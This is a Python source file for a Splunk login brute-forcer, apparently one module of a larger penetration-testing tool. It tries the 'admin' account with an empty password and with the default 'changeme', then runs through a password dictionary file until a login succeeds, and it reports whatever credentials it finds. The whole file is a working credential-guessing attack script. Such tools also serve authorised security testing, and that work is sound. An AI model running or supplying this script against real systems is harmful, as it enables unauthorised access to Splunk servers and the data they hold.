#!/usr/bin/env python3

# Splunk Login Bruteforce

# %%%%%%%%%%% Libraries %%%%%%%%%%%#


import os
import sys
import globals
import splunklib.client as client

sys.path.append('../')

# %%%%%%%%%%% Functions %%%%%%%%%%%#


def bruteforce_splunk(ip, port):

	username = "admin"
	__location__ = os.path.realpath(os.path.join(
		os.getcwd(), os.path.dirname(__file__)))
	file = open(os.path.join(__location__, 'dict.txt'))
	bfs = 0
	free = 0
	defaultpass = 0

	# First Try Default Password "changeme" and Splunk Free Version

	try:
		client.connect(host=ip, port=port, username=username, password="")
		free = 1
	except:
		pass
	try:
		client.connect(
			host=ip, port=port, username=username, password="changeme")
		defaultpass = 1
	except:
		pass

	if (free and defaultpass) == 0:
		for line in file:
			splunk_password = line.strip('\n\r')

			try:
				client.connect(
					host=ip, port=port,
					username=username, password=splunk_password)
				bfs = 1
				break
			except:
				pass

	if (bfs or free or defaultpass) == 1:
		globals.messages(7)
		if free == 1:
			globals.messages(9, ['admin', 'no password'])
			file.close()
		elif defaultpass == 1:
			globals.messages(9, ['admin', 'changeme'])
			file.close()
		else:
			globals.messages(9, ['admin', splunk_password])
			file.close()

	else:
		globals.messages(8)
		file.close()

# %%%%%%%%%% The End %%%%%%%%%%#
